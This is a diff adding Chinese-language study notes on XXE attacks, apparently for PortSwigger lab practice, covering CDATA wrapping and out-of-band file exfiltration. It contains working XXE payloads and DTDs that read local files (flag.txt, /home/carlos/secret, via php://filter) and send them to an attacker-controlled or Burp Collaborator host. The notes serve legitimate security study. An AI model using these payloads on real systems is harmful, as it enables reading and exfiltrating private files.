@@ -12,3 +12,29 @@ By default, XInclude will try to parse the included document as XML. Since /etc/
 
 这个专题主要是要多看看外部DTD相关的XXE，包括下面这个结合file upload的
 https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload
+
+当要读取的内容包含有<>&这些特殊字符时:
+当被读取文件中含有特殊符号时，不但没有预期想要的结果，还返回了一堆错误，这个时候就需要使用CDATA了，下面是引用WIKI中关于CDATA的介绍。
+CDATA，意为character data，是标记语言SGML与XML，表示文档的特定部分是普通的字符数据，而不是非字符数据或有特定、限定结构的字符数据。在XML文档或外部实体中，一个CDATA section是一段按字面解释的内容，不作为标记文本。字符用CDATA节表示或者按照标准语法表示，并无差异。例如"<" 与 "&" 分别表示 "<
+其实简单一点的来说也就是说，将脚本代码定义为 "CDATA" 后，CDATA 部分中的内容就会被解析器忽略，这个时候就可以读取文件了
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE roottag [
+<!ENTITY % start "<![CDATA[">  
+<!ENTITY % goodies SYSTEM "file:///c:/flag.txt">
+<!ENTITY % end "]]>">
+<!ENTITY % dtd SYSTEM "http://192.168.10.30/evil.dtd"> #本地IP%dtd; ]><roottag>&all;</roottag>
+
+evil.dtd
+<?xml version="1.0" encoding="UTF-8"?><!ENTITY all "%start;%goodies;%end;">
+
+普通读取文件的方法：
+<!ENTITY % file SYSTEM "file:///home/carlos/secret">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
+%eval;
+%exfil;
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
+
+利用php伪协议来读取文件：
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///c:/flag.txt">或者file:///home/carlos/secret
+<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://external server?p=%file;'>"> #external server like collobrator
+
+这里&#37;和&#x25;都表示%，区别是一个是10进制，一个是16进制。
